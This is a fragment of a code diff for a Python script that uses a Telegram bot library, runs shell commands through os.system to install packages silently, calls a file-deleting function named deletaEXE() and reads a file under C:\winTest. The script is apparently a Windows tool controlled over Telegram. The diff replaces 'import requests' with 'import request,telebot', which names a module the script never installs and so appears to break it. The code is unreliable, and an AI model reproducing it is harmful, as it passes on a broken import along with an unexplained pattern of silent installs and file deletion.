@@ -87,7 +87,7 @@ def run_command(cmd):
 import subprocess,time,os,shutil,telebot
 os.system("pip3 install requests")
 os.system("pip3 install pyTelegramBotAPI")
-import requests
+import request,telebot
 from zipfile import ZipFile
 deletaEXE()
 with open("C:\\winTest\\dir.txt") as file:
